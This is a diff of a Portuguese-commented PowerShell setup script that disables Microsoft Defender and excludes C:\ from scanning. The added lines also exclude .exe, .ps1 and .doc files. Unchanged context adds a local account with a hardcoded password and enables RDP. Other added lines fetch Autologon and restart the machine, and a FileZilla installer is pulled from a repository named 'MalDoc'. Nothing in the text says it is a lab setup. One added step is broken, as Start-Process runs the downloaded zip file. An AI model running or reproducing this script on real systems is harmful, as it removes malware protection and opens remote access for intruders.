@@ -7,6 +7,9 @@
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
 Set-MpPreference -DisableRealtimeMonitoring $true
 Add-MpPreference -ExclusionPath "C:\"
+Add-MpPreference -ExclusionExtension ".exe"
+Add-MpPreference -ExclusionExtension ".ps1"
+Add-MpPreference -ExclusionExtension ".doc"
 
 net user automate Automate123456! /add
 
@@ -17,6 +20,23 @@ Start-Service -Name "LanmanServer"
 # Habilite o serviço RDP
 
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
+
+# Defina a URL do download do Autologon
+$AutologonDownloadURL="https://download.sysinternals.com/files/AutoLogon.zip"
+
+# Defina o caminho de destino onde o arquivo será baixado
+$DownloadPath = "C:\Windows\Temp\Autologon.zip"
+
+#Baixe o arquivo usando o URL
+Invoke-WebRequest -Uri $AutologonDownloadURL -OutFile $DownloadPath
+
+New-Item -ItemType Directory -Path "C:\Windows\Temp\Autologon"
+
+Expand-Archive -Path "C:\Windows\Temp\Autologon.zip" -DestinationPath "C:\Windows\Temp\Autologon\"
+
+Start-Process -FilePath $DownloadPath -Wait
+
+Restart-Computer
 
 # Defina a URL do download do FileZilla
 $FileZillaDownloadURL = "https://github.com/jovair1994/MalDoc/raw/main/FileZilla_Server_1.8.0_win64-setup.exe"
